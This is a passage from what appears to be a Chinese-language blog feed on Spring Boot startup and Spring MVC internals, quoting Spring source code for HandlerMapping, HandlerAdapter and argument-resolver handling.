punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">Duration</span> timeTakenToReady <span class="token operator">=</span> <span class="token class-name">Duration</span><span class="token punctuation">.</span><span class="token function">ofNanos</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">nanoTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> startTime<span class="token punctuation">)</span><span class="token punctuation">;</span>      listeners<span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> timeTakenToReady<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">handleRunFailure</span><span class="token punctuation">(</span>context<span class="token punctuation">,</span> ex<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalStateException</span><span class="token punctuation">(</span>ex<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> context<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>1、run 方法内启动 createApplicationContext 会创建一个IOC容器AnnotationConfigServletWebServerApplicationContext</p><p>2、然后执行refreshContext，会执行到Spring刷新12大步，然后再onRefresh时候执行Tomcat的启动</p><p>3、Tomcat启动的时候会加载所有的Servlet</p><p>4、DispatcherServlet回加载九大组件，然后执行整个初始化流程</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>SpringBoot源码</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>剑指源码-springmvc-(三)-HandlerMapping和HandlerAdapter细节</title>
    <link href="/posts/5a47f1a6.html"/>
    <url>/posts/5a47f1a6.html</url>
    
    <content type="html"><![CDATA[<p>HandlerMapping的几种实现与HandlerAdapter几种原理及其内部细节剖析</p><span id="more"></span><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><blockquote><p>HandlerMapping和HandlerAdapter初始化流程基本一致</p></blockquote><p>1、DispatcherServlet创建对象后，Tomcat调用初始化回调钩子initServletBean()</p><p>2、容器启动完成后，Spring发送事件，执行到DispatcherServlet.onRefresh()</p><p>3、onRefresh执行九大组件的初始化</p><p>HandlerMapping初始化流程（RequestMappingHandlerMapping为例）</p><ul><li>创建配置中的HandlerMapping对象3种</li><li>启动createBean使用IOC创建容器</li><li>基于Spring的原理，实现了InitializingBean,容器启动后续执行afterPropertiesSet</li><li>拿到子容器（Web容器）的所有组件，扫描@Controller或者@RequestMapping</li><li>将分析到的信息放于HandlerMapping的registry对象中，以便后续使用</li></ul><h2 id="HandlerMapping的实现类"><a href="#HandlerMapping的实现类" class="headerlink" title="HandlerMapping的实现类"></a>HandlerMapping的实现类</h2><ul><li><p><strong>BeanNameUrlHandlerMapping</strong>  以bean的名字作为url路径，进行映射</p></li><li><p><strong>SimpleUrlHandlerMapping</strong> 手动配置url与handler的映射</p></li><li><p><strong>RequestMappingHandlerMapping</strong> 使用注解的形式来标识url与handler的映射,平时这种使用最多，重点分析</p></li><li><p><strong>RouterFunctionMapping</strong>  支持函数式以及webFlux相关的功能</p></li></ul><h3 id="BeanNameUrlHandlerMapping"><a href="#BeanNameUrlHandlerMapping" class="headerlink" title="BeanNameUrlHandlerMapping"></a><strong>BeanNameUrlHandlerMapping</strong></h3><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BeanNameUrlHandlerMapping</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractDetectingUrlHandlerMapping</span> <span class="token punctuation">&#123;</span>   <span class="token comment">/**    * Checks name and aliases of the given bean for URLs, starting with "/".    */</span>   <span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">determineUrlsForHandler</span><span class="token punctuation">(</span><span class="token class-name">String</span> beanName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> urls <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>beanName<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         urls<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> aliases <span class="token operator">=</span> <span class="token function">obtainApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getAliases</span><span class="token punctuation">(</span>beanName<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> alias <span class="token operator">:</span> aliases<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>alias<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            urls<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>alias<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">toStringArray</span><span class="token punctuation">(</span>urls<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该实现类可以把IOC容器中name以”&#x2F;“ 开头的Bean注册为handler,</p><h3 id="SimpleUrlHandlerMapping"><a href="#SimpleUrlHandlerMapping" class="headerlink" title="SimpleUrlHandlerMapping"></a>SimpleUrlHandlerMapping</h3><p>手动配置url与handler的映射,初始化的时候就注册进去了</p><h3 id="RequestMappingHandlerMapping"><a href="#RequestMappingHandlerMapping" class="headerlink" title="RequestMappingHandlerMapping"></a>RequestMappingHandlerMapping</h3><p>这是最常用的HandlerMapping实现，通过它，我们可以使用注解的形式来标识url与handler的映射：</p><p> AbstractHandlerMethodMapping.initHandlerMethods然后执行到 processCandidateBean-&gt;detectHandlerMethods再到交由子类实现getMappingForMethod</p><p>RequestMappingHandlerMapping中getMappingForMethod</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">RequestMappingInfo</span> <span class="token function">createRequestMappingInfo</span><span class="token punctuation">(</span><span class="token class-name">AnnotatedElement</span> element<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token class-name">RequestMapping</span> requestMapping <span class="token operator">=</span> <span class="token class-name">AnnotatedElementUtils</span><span class="token punctuation">.</span><span class="token function">findMergedAnnotation</span><span class="token punctuation">(</span>element<span class="token punctuation">,</span> <span class="token class-name">RequestMapping</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token class-name">RequestCondition</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> condition <span class="token operator">=</span> <span class="token punctuation">(</span>element <span class="token keyword">instanceof</span> <span class="token class-name">Class</span> <span class="token operator">?</span>         <span class="token function">getCustomTypeCondition</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">)</span> element<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">getCustomMethodCondition</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">)</span> element<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token punctuation">(</span>requestMapping <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token function">createRequestMappingInfo</span><span class="token punctuation">(</span>requestMapping<span class="token punctuation">,</span> condition<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>会去判断实现RequestMapping的方法实现，而加入RequestMappingInfo信息中</p><h3 id="RouterFunctionMapping"><a href="#RouterFunctionMapping" class="headerlink" title="RouterFunctionMapping"></a>RouterFunctionMapping</h3><p>支持webflux相关</p><h2 id="HandlerAdapter的实现类"><a href="#HandlerAdapter的实现类" class="headerlink" title="HandlerAdapter的实现类"></a>HandlerAdapter的实现类</h2><ul><li><strong>HttpRequestHandlerAdapter</strong> 判断是否是实现HttpRequestHandler接口</li><li><strong>SimpleControllerHandlerAdapter</strong>判断是否实现Controller接口</li><li><strong>RequestMappingHandlerAdapter</strong> 判断是不是HandlerMethod，注解类型的都是这种</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">HandlerAdapter</span> <span class="token punctuation">&#123;</span><span class="token comment">/** * 是否支持该处理器 */</span>   <span class="token keyword">boolean</span> <span class="token function">supports</span><span class="token punctuation">(</span><span class="token class-name">Object</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** * 执行处理器，返回 ModelAndView 结果 */</span>   <span class="token annotation punctuation">@Nullable</span>   <span class="token class-name">ModelAndView</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">;</span><span class="token comment">/** * 返回请求的最新更新时间，如果不支持该操作，则返回 -1 即可 */</span>   <span class="token annotation punctuation">@Deprecated</span>   <span class="token keyword">long</span> <span class="token function">getLastModified</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">Object</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="HttpRequestHandlerAdapter"><a href="#HttpRequestHandlerAdapter" class="headerlink" title="HttpRequestHandlerAdapter"></a>HttpRequestHandlerAdapter</h3><p>如果这个处理器实现了 <code>HttpRequestHandler</code> 接口，则使用 <code>HttpRequestHandlerAdapter</code> 调用该处理器的 <code>handleRequest(HttpServletRequest request, HttpServletResponse response)</code>方法去处理器请求</p><h3 id="SimpleControllerHandlerAdapter"><a href="#SimpleControllerHandlerAdapter" class="headerlink" title="SimpleControllerHandlerAdapter"></a>SimpleControllerHandlerAdapter</h3><p>和 HttpRequestHandlerAdapter 差不多，如果这个处理器实现了 <code>Controoler</code> 接口，则使用 <code>HttpRequestHandlerAdapter</code> 调用该处理器的 <code>handleRequest(HttpServletRequest request, HttpServletResponse response)</code>方法去处理器请求，直接返回处理器执行后返回 <code>ModelAndView</code></p><h3 id="RequestMappingHandlerAdapter"><a href="#RequestMappingHandlerAdapter" class="headerlink" title="RequestMappingHandlerAdapter"></a>RequestMappingHandlerAdapter</h3><p>实现 BeanFactoryAware、InitializingBean 接口，继承 AbstractHandlerMethodAdapter 抽象类，基于 <code>@RequestMapping</code> 注解的 HandlerMethod 处理器的 HandlerMethodAdapter 实现类</p><p>几个主要的属性对象：</p><ul><li><code>HandlerMethodArgumentResolverComposite argumentResolvers</code>：参数处理器组合对象</li><li><code>HandlerMethodReturnValueHandlerComposite returnValueHandlers</code>：返回值处理器组合对象</li><li><code>List&lt;HttpMessageConverter&lt;?&gt;&gt; messageConverters</code>：HTTP 消息转换器集合对象</li><li><code>List&lt;Object&gt; requestResponseBodyAdvice</code>： RequestResponseAdvice 集合对象</li></ul><h4 id="InitializingBean对参数初始化"><a href="#InitializingBean对参数初始化" class="headerlink" title="InitializingBean对参数初始化"></a>InitializingBean对参数初始化</h4><blockquote><p>这个时候会准备参数解析器和返回值处理器</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// Do this first, it may add ResponseBody advice beans</span><span class="token function">initControllerAdviceCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>argumentResolvers <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> resolvers <span class="token operator">=</span> <span class="token function">getDefaultArgumentResolvers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>argumentResolvers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HandlerMethodArgumentResolverComposite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResolvers</span><span class="token punctuation">(</span>resolvers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>initBinderArgumentResolvers <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> resolvers <span class="token operator">=</span> <span class="token function">getDefaultInitBinderArgumentResolvers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>initBinderArgumentResolvers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HandlerMethodArgumentResolverComposite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addResolvers</span><span class="token punctuation">(</span>resolvers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodReturnValueHandler</span><span class="token punctuation">></span></span> handlers <span class="token operator">=</span> <span class="token function">getDefaultReturnValueHandlers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HandlerMethodReturnValueHandlerComposite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addHandlers</span><span class="token punctuation">(</span>handlers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="参数解析器和返回值处理器的前置工作"><a href="#参数解析器和返回值处理器的前置工作" class="headerlink" title="参数解析器和返回值处理器的前置工作"></a>参数解析器和返回值处理器的前置工作</h4><p> RequestMappingHandlerAdapter.invokeHandlerMethod</p><figure><div class="code-wrapper"><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Nullable</span><span class="token keyword">protected</span> <span class="token class-name">ModelAndView</span> <span class="token function">invokeHandlerMethod</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span><span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">HandlerMethod</span> handlerMethod<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span><span class="token class-name">ServletWebRequest</span> webRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServletWebRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">WebDataBinderFactory</span> binderFactory <span class="token operator">=</span> <span class="token function">getDataBinderFactory</span><span class="token punctuation">(</span>handlerMethod<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ModelFactory</span> modelFactory <span class="token operator">=</span> <span class="token function">getModelFactory</span><span class="token punctuation">(</span>handlerMethod<span class="token punctuation">,</span> binderFactory<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/** * 用于组合执行期间所需要的一些组件 */</span><span class="token class-name">ServletInvocableHandlerMethod</span> invocableMethod <span class="token operator">=</span> <span class="token function">createInvocableHandlerMethod</span><span class="token punctuation">(</span>handlerMethod<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>argumentResolvers <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>invocableMethod<span class="token punctuation">.</span><span class="token function">setHandlerMethodArgumentResolvers</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>argumentResolvers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>invocableMethod<span class="token punctuation">.</span><span class="token function">setHandlerMethodReturnValueHandlers</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>invocableMethod<span class="token punctuation">.</span><span class="token function">setDataBinderFactory</span><span class="token punctuation">(</span>binderFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>invocableMethod<span class="token punctuation">.</span><span class="token function">setParameterNameDiscoverer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>parameterNameDiscoverer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ModelAndViewContainer</span> mavContainer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ModelAndViewContainer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mavContainer<span class="token punctuation">.</span><span class="token function">addAllAttributes</span><span class="token punctuation">(</span><span class="token class-name">RequestContextUtils</span><span class="token punctuation">.</span><span class="token function">getInputFlashMap</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>modelFactory<span class="token punctuation">.</span><span class="token function">initModel</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> invocableMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>mavContainer<span class="token punctuation">.</span><span class="token function">setIgnoreDefaultModelOnRedirect</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>ignoreDefaultModelOnRedirect<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">AsyncWebRequest</span> asyncWebRequest <span class="token operator">=</span> <span class="token class-name">WebAsyncUtils</span><span class="token punctuation">.</span><span class="token function">createAsyncWebRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>asyncWebRequest<span class="token punctuation">.</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>asyncRequestTimeout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">WebAsyncManager</span> asyncManager <span class="token operator">=</span> <span class="token class-name">WebAsyncUtils</span><span class="token punctuation">.</span><span class="token function">getAsyncManager</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>asyncManager<span class="token punctuation">.</span><span class="token function">setTaskExecutor</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>taskExecutor<span class="token punctuation">)</span><span class="token punctuation">;</span>asyncManager<span class="token punctuation">.</span><span class="token function">setAsyncWebRequest</span><span class="token punctuation">(</span>asyncWebRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>asyncManager<span class="token punctuation">.</span><span class="token function">registerCallableInterceptors</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>callableInterceptors<span class="token punctuation">)</span><span class="token punctuation">;</span>asyncManager<span class="token punctuation">.</span><span class="token function">registerDeferredResultInterceptors</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>deferredResultInterceptors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>asyncManager<span class="token punctuation">.</span><span class="token function">hasConcurrentResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">Object</span> result <span class="token operator">=</span> asyncManager<span class="token punctuation">.</span><span class="token function">getConcurrentResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>mavContainer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ModelAndViewContainer</span><span class="token punctuation">)</span> asyncManager<span class="token punctuation">.</span><span class="token function">getConcurrentResultContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>asyncManager<span class="token punctuation">.</span><span class="token function">clearConcurrentResult</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">LogFormatUtils</span><span class="token punctuation">.</span><span class="token function">traceDebug</span><span class="token punctuation">(</span>logger<span class="token punctuation">,</span> traceOn <span class="token operator">-></span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span> formatted <span class="token operator">=</span> <span class="token class-name">LogFormatUtils</span><span class="token punctuation">.</span><span class="token function">formatValue</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token operator">!</span>traceOn<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token string">"Resume with async result ["</span> <span class="token operator">+</span> formatted <span class="token operator">+</span> <span class="token string">"]"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>invocableMethod <span class="token operator">=</span> invocableMethod<span class="token punctuation">.</span><span class="token function">wrapConcurrentResult</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 具体执行期间，会传入临时容器mavContainer */</span>invocableMethod<span class="token punctuation">.</span><span class="token function">invokeAndHandle</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">,</span> mavContainer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>asyncManager<span class="token punctuation">.</span><span class="token function">isConcurrentHandlingStarted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/** * 从mavContainer抽取ModelAndView */</span><span class="token keyword">return</span> <span class="token function">getModelAndView</span><span class="token punctuation">(</span>mavContainer<span class="token punctuation">,</span> modelFactory<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>webRequest<span class="token punctuation">.</span><span class="token function">requestCompleted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>未来反射解析目标方法中的每一个值 argumentResolvers</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">if (this.argumentResolvers !&#x3D; null) &#123;   invocableMethod.setHandlerMethodArgumentResolvers(this.argumentResolvers);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>返回值处理器，未来用于处理目标方法执行后的返回值，无论目标方法返回什么会转换为适配器所使用的ModelAndView</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">if (this.returnValueHandlers !&#x3D; null) &#123;    invocableMethod.setHandlerMethodReturnValueHandlers(this.returnValueHandlers); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ServletInvocableHandlerMethod invocableMethod &#x3D; createInvocableHandlerMethod(handlerMethod);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>把该有的组件组合到ServletInvocableHandlerMethod对象中去，最终使用ServletInvocableHandlerMethod进行invokeAndHandle，将数据最后封装到ModelAndViewContainer中去，最后再将ModelAndViewContainer（临时容器，每一次请求都是新new 的对象，同一次请求期间共享数据）抽取ModelAndView（数据和视图）。</p><h4 id="参数解析器"><a href="#参数解析器" class="headerlink" title="参数解析器"></a>参数解析器</h4><blockquote><p>27个参数解析器</p></blockquote><p> ServletInvocableHandlerMethod.invokeAndHandle–&gt;invokeForRequest–&gt;getMethodArgumentValues</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">protected Object[] getMethodArgumentValues(NativeWebRequest request, @Nullable ModelAndViewContainer mavContainer,Object... providedArgs) throws Exception &#123;MethodParameter[] parameters &#x3D; getMethodParameters();if (ObjectUtils.isEmpty(parameters)) &#123;return EMPTY_ARGS;&#125;Object[] args &#x3D; new Object[parameters.length];&#x2F;** * 遍历所有的参数使用参数解析器去解析，首个参数解析器解析到了就跳过，执行下一个参数解析 *&#x2F;for (int i &#x3D; 0; i &lt; parameters.length; i++) &#123;MethodParameter parameter &#x3D; parameters[i];parameter.initParameterNameDiscovery(this.parameterNameDiscoverer);args[i] &#x3D; findProvidedArgument(parameter, providedArgs);if (args[i] !&#x3D; null) &#123;continue;&#125;&#x2F;** * 这里判断采用门面以27种都去判断一遍 *&#x2F;if (!this.resolvers.supportsParameter(parameter)) &#123;throw new IllegalStateException(formatArgumentError(parameter, &quot;No suitable resolver&quot;));&#125;try &#123;&#x2F;** * 支持了就开始解析 *&#x2F;args[i] &#x3D; this.resolvers.resolveArgument(parameter, mavContainer, request, this.dataBinderFactory);&#125;catch (Exception ex) &#123;&#x2F;&#x2F; Leave stack trace for later, exception may actually be resolved and handled...if 